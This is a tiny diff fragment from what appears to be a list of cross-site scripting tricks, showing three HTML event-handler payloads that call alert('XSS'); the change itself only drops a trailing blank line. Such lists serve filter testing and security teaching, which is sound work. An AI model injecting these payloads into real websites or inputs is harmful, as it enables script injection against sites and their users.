@@ -49,4 +49,3 @@ tricks:
       <input onfocus=alert("XSS") autofocus>
       <details ontoggle=alert("XSS") open>
       <marquee onstart=alert("XSS")>
-
